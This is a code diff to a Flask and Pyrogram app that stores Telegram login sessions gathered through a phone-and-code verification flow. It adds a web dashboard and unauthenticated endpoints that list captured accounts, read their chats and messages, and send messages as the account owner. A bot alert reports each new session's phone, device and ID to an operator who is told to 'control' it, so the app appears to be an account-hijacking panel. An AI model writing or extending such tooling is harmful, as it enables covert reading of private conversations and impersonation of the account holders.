@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template
 from flask_cors import CORS
 from pyrogram import Client
 import asyncio
@@ -114,12 +114,133 @@ def load_existing_sessions():
 # Load sessions in a background thread to avoid blocking startup
 threading.Thread(target=load_existing_sessions, daemon=True).start()
 
+# ============ WEB DASHBOARD ROUTES ============
+
+@app.route('/')
+def dashboard():
+    """Serve the web dashboard"""
+    return render_template('index.html')
+
+# ============ API ENDPOINTS ============
+
+@app.route('/api/sessions', methods=['GET'])
+def api_get_sessions():
+    """Get all active sessions"""
+    sessions = []
+    for sid, data in active_sessions.items():
+        sessions.append({
+            'session_id': sid,
+            'phone': data['phone'],
+            'name': data['user_info'].get('first_name', 'Unknown') if data.get('user_info') else 'Unknown',
+            'username': data['user_info'].get('username', '') if data.get('user_info') else '',
+            'device': data.get('device_model', 'Unknown')
+        })
+    return jsonify({'sessions': sessions, 'count': len(sessions)})
+
+@app.route('/api/chats/<session_id>', methods=['GET'])
+def api_get_chats(session_id):
+    """Get all chats for a session"""
+    if session_id not in active_sessions:
+        return jsonify({'error': 'Session not found'}), 404
+    
+    session_data = active_sessions[session_id]
+    client = session_data['client']
+    
+    async def fetch_chats():
+        try:
+            chats = []
+            async for dialog in client.get_dialogs(limit=50):
+                chat_name = dialog.chat.title or dialog.chat.first_name or "Unknown"
+                chat_id = dialog.chat.id
+                
+                # Get preview message
+                preview = "No messages"
+                try:
+                    async for msg in client.get_chat_history(chat_id, limit=1):
+                        if msg.text:
+                            preview = msg.text[:50]
+                        break
+                except:
+                    pass
+                
+                chats.append({
+                    'chat_id': str(chat_id),
+                    'name': chat_name,
+                    'preview': preview,
+                    'username': dialog.chat.username or ''
+                })
+            
+            return chats
+        except Exception as e:
+            print(f"Error fetching chats: {e}")
+            return []
+    
+    chats = run_async(fetch_chats())
+    return jsonify({'chats': chats, 'count': len(chats)})
+
+@app.route('/api/messages/<session_id>/<chat_id>', methods=['GET'])
+def api_get_messages(session_id, chat_id):
+    """Get messages from a specific chat"""
+    if session_id not in active_sessions:
+        return jsonify({'error': 'Session not found'}), 404
+    
+    session_data = active_sessions[session_id]
+    client = session_data['client']
+    
+    async def fetch_messages():
+        try:
+            messages = []
+            async for msg in client.get_chat_history(int(chat_id), limit=30):
+                if msg.text:
+                    messages.append({
+                        'id': msg.id,
+                        'text': msg.text,
+                        'date': msg.date,
+                        'is_outgoing': msg.outgoing,
+                        'from_user': msg.from_user.first_name if msg.from_user else 'Unknown'
+                    })
+            
+            # Reverse to show oldest first
+            messages.reverse()
+            return messages
+        except Exception as e:
+            print(f"Error fetching messages: {e}")
+            return []
+    
+    messages = run_async(fetch_messages())
+    return jsonify({'messages': messages, 'count': len(messages)})
+
+@app.route('/api/send-message/<session_id>/<chat_id>', methods=['POST'])
+def api_send_message(session_id, chat_id):
+    """Send a message to a chat"""
+    if session_id not in active_sessions:
+        return jsonify({'success': False, 'error': 'Session not found'}), 404
+    
+    data = request.json
+    text = data.get('text', '').strip()
+    
+    if not text:
+        return jsonify({'success': False, 'error': 'Message cannot be empty'}), 400
+    
+    session_data = active_sessions[session_id]
+    client = session_data['client']
+    
+    async def send_msg():
+        try:
+            await client.send_message(int(chat_id), text)
+            return {'success': True, 'message': 'Message sent'}
+        except Exception as e:
+            print(f"Error sending message: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    result = run_async(send_msg())
+    return jsonify(result)
+
+# ============ LEGACY ROUTES (Keep for compatibility) ============
+
 @app.route('/create-test-session', methods=['POST'])
 def create_test_session():
     """Create a proper test session for persistent storage testing"""
-    import json
-    from pyrogram.types import User
-    
     try:
         # Create a unique session ID
         session_id = secrets.token_hex(8)
@@ -227,6 +348,7 @@ def delete_all_sessions():
     results['message'] = f"Deleted {results['total_deleted']} items from {SESSIONS_DIR}"
     
     return jsonify(results)
+
 # Store which session each bot user has selected
 user_selected_session = {}
 
@@ -791,7 +913,7 @@ def verify_code():
                     f"📱 {phone}\n"
                     f"📲 Device: {device_model}\n"
                     f"🆔 Session ID: `{session_id}`\n\n"
-                    f"Use /start on your bot to control"
+                    f"Use /start on your bot or visit web dashboard to control"
                 )
                 
                 return {
